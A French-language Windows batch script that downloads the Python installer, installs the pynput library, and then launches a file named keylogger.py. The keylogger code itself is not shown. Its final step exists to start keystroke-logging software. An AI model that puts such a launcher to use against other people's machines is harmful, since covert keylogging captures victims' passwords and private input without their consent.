@echo off
title INSTALLATION MANUELLE ET LANCEMENT
color 0E

echo.
echo ========================================================
echo      ETAPE 1 : PREPARATION DE L'ENVIRONNEMENT
echo ========================================================
echo.
echo [1] Telechargement de Python (Si vous ne l'avez pas fait).
echo.
curl -o python_installer.exe https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe
echo [ACTION REQUISE] : Executez 'python_installer.exe', cochez 'Add Python to PATH' et installez-le.
pause
cls

echo.
echo ========================================================
echo      ETAPE 2 : INSTALLATION DE PYNPUT
echo ========================================================
echo.
echo [INFO] Installation des librairies necessaires.
echo.
:: On utilise la commande 'py' qui est plus fiable que 'python' ou 'pip' seul
py -3 -m pip install pynput

if %errorlevel% neq 0 (
    color 0C
    echo.
    echo [ERREUR FATALE] Pynput n'a pas pu etre installe.
    echo Verifiez que Python est dans le PATH et relancez.
    pause
    exit
)

echo.
echo [SUCCES] Librairies installees.
echo.
echo ========================================================
echo      ETAPE 3 : LANCEMENT DU KEYLOGGER
echo ========================================================
echo.
pause
:: Lancement du keylogger
python keylogger.py
